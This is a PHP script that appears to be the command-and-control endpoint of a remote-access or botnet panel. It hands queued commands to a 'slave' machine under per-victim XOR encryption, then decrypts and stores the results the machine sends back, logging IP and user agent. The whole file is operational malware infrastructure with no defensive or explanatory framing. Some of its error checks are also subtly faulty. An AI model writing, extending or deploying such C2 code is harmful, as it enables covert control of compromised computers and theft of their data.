<?php
include 'conn.php';
include 'chcksid.php';
include 'functions/retrieveAndShow.function.php';
include 'functions/updateLogs.function.php';
include 'ipAndUserAgent.php';
include 'functions/retrieveKey.function.php';
// Check if spesific command is setted for slave
if (!isset($_POST["rspns"]))
{
    $command = showCommand($str, $conn);
      if(strpos($command, 'error'))
        {
          updateLogs($conn, "Error","Error while trying to send command", $agent,$str,$ip);
        }
        else {
          $xorKey = retrieveXorKey($conn, $str);
            if(!strpos($xorKey, 'error'))
              {
                $encryptedCommand = encrypt($command, $xorKey);
                echo $encryptedCommand;

              }
              else{
                  updateLogs($conn, "Error","Error while retrieving xor key", $agent,$str,$ip);
              }

        }
}
else
{

$xorKey =  retrieveXorKey($conn, $str);
    if(!strpos($xorKey, 'error'))
      {
        if( 3 * (strlen($_POST["rspns"]) / 4) < 500000){
        $response = decrypt($_POST["rspns"], $xorKey);
        $retrievedResponse = retrieveResponse($response, $str, $conn);
		}
	else{
       	    $retrievedResponse = retrieveResponse("Content bigger than 1mb, try to get it as file", $str, $conn);
        	}  
	if(strpos($retrievedResponse, 'error'))
          {
              updateLogs($conn, "Error","Error while trying to retrieve response", $agent,$str,$ip);
          }
      }
      else{
          updateLogs($conn, "Error","Error while retrieving xor key", $agent,$str,$ip);
      }
}
?>
